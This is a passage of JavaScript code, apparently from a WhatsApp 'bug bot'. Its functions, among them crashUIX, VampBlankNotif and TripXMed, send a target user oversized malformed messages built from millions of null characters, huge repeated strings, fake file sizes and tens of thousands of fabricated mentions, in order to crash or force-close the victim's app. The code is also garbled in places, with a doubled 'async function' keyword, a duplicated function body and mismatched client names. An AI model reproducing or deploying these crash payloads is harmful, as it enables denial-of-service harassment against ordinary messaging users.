      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function crashUIX(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "\n",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function VampBlankNotif(target, Ptcp = false) {
     virtex =
        "𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗜𝘀 𝗖𝗼𝗺𝗶𝗻𝗴🤯 " +
        "ꦽ".repeat(92000) +
        "_*~@8~*_\n".repeat(92000);

    await vamp.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: virtex,
                        },
                        nativeFlowMessage: {
                            name: "call_permission_request",
                            messageParamsJson: "\u0000",
                        },
                        contextInfo: {
                            mentionedJid: ["0@s.whatsapp.net"],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "𝗣𝗲𝗰𝗶𝗻𝘁𝗮 𝗕𝗼𝗸𝗲𝗽",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                },
                            },
                        },
                    },
                },
            },
        },
        Ptcp
            ? {
                  participant: {
                      jid: target,
                  },
              }
            : {}
    );

    console.log(chalk.green.bold("VaMPiRe-BuG-BoT"));
}

async function async function TripXMed(target) {
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "" },
              footer: { text: "" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await Yuukey.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`Forclose to ${target}`);
    } catch (err) {
      console.error("❌ Gagal forclose:", err);
    }
  }
}{
  for (let r = 0; r < 1; r++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
           messageContextInfo: {
            deviceListMetadata: {}, 
            deviceListMetaeataVersion: 2,
            messageSecret: crypto.randomBytes(25), 
            supportPayload: {
            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "" },
              footer: { text: "" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await Yuukey.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`Forclose to ${target}`);
    } catch (err) {
      console.error("❌ Gagal forclose:", err);
    }
  }
}